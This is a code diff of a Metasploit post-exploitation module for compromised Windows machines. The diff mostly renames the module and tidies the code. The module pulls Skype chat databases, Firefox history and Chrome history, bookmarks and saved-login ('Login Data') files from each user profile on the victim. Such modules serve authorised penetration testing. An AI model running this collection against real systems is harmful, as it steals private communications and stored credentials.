@@ -18,10 +18,10 @@ class Metasploit3 < Msf::Post
 
   def initialize(info={})
     super( update_info( info,
-        'Name' => 'Grab Forensic Artifacts',
-        'Description' => %q{'Searches for, and pulls, forensically-interesting data from the victim machine.'},
+        'Name' => 'Windows Gather Skype, Firefox, and Chrome Artifacts',
+        'Description' => %q{'Gathers Skype chat logs, Firefox history, and Chrome History data from the victim machine.'},
         'License' => MSF_LICENSE,
-        'Author' => [ 'Joshua Harper GCFE GCFA GSEC PI, Lt. West Campus Cyber Command, University of Texas Austin (@JonValt) <josh at radixtx dot com>'],
+        'Author' => [ 'Joshua Harper (@JonValt) <josh at radixtx dot com>'],
         'Platform' => %w{ win },
         'SessionTypes' => [ 'meterpreter', 'shell' ]
       ))
@@ -31,17 +31,15 @@ class Metasploit3 < Msf::Post
         OptInt.new('TIMEOUT', [true ,'Timeout in seconds when downloading file on a shell session.', 120]),
       ], self.class)
   end
- #Generic Ruby Stuff for my personal reference
   def run
-    print_status("Hello from Metasploit! It is a pleasure to serve you today.")
-    print_status("Grabbing User Profiles")
+    print_status("Grabbing user profiles")
     grab_user_profiles().each do |p|
-       skype_download = download_artifact("AppData",p,"skype", "Skype", "main.db", "binary/db") if check_artifact(p['AppData'],p['UserName'],"skype", "Skype")
-       firefox_download = download_artifact("AppData",p,"Firefox", "Mozilla", "places.sqlite","binary/db") if check_artifact(p['AppData'],p['UserName'],"Firefox","Mozilla")
-       chrome_download = download_artifact("LocalAppData",p,"Chrome_History", "Google", "History.","binary/db") if check_artifact(p['LocalAppData'],p['UserName'],"Chrome History","Google")
-       chrome_download = download_artifact("LocalAppData",p,"Chrome_History", "Google", "Login Data.","binary/db") if check_artifact(p['LocalAppData'],p['UserName'],"Chrome History","Google")
-       chrome_download = download_artifact("LocalAppData",p,"Chrome_History", "Google", "Archived History.","binary/db") if check_artifact(p['LocalAppData'],p['UserName'],"Chrome History","Google")
-       chrome_download = download_artifact("LocalAppData",p,"Chrome_History", "Google", "Bookmarks.","binary/db") if check_artifact(p['LocalAppData'],p['UserName'],"Chrome History","Google")
+       download_artifact("AppData",p,"skype", "Skype", "main.db", "binary/db") if check_artifact(p['AppData'],p['UserName'],"skype", "Skype")
+       download_artifact("AppData",p,"Firefox", "Mozilla", "places.sqlite","binary/db") if check_artifact(p['AppData'],p['UserName'],"Firefox","Mozilla")
+       download_artifact("LocalAppData",p,"Chrome_History", "Google", "History.","binary/db") if check_artifact(p['LocalAppData'],p['UserName'],"Chrome History","Google")
+       download_artifact("LocalAppData",p,"Chrome_History", "Google", "Login Data.","binary/db") if check_artifact(p['LocalAppData'],p['UserName'],"Chrome History","Google")
+       download_artifact("LocalAppData",p,"Chrome_History", "Google", "Archived History.","binary/db") if check_artifact(p['LocalAppData'],p['UserName'],"Chrome History","Google")
+       download_artifact("LocalAppData",p,"Chrome_History", "Google", "Bookmarks.","binary/db") if check_artifact(p['LocalAppData'],p['UserName'],"Chrome History","Google")
     end
   end
   def check_artifact(path, user, artifact_name, artifact_dir)
